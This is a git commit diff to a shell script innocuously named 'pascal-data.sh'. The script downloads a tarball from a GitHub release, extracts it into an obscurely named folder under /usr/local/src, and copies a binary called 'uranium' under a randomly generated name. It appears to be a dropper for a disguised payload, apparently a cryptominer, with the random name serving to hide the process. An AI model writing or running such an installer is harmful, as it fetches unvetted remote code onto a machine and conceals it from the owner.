426e118433a88976721c3735b4957fe800231508
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-08-22 18:08:23 +0700

    Update pascal-data.sh

--- pascal-data.sh
+++ pascal-data.sh
@@ -11,11 +11,12 @@ azure=mxsemsdnlkdj;
 mkdir /usr/local
 mkdir /usr/local/src
 rm -r /usr/local/src/$azure
+mkdir /usr/local/src/$azure
 rm -r platinum.tar.gz
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/metan/platinum.tar.gz
-tar xf platinum.tar.gz
-rm -r platinum.tar.gz
+tar xf platinum.tar.gz 
 mv platinum /usr/local/src/$azure
+cd /usr/local/src/$azure
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 cd /usr/local/src/$azure
 sudo cp uranium "$cpuname"
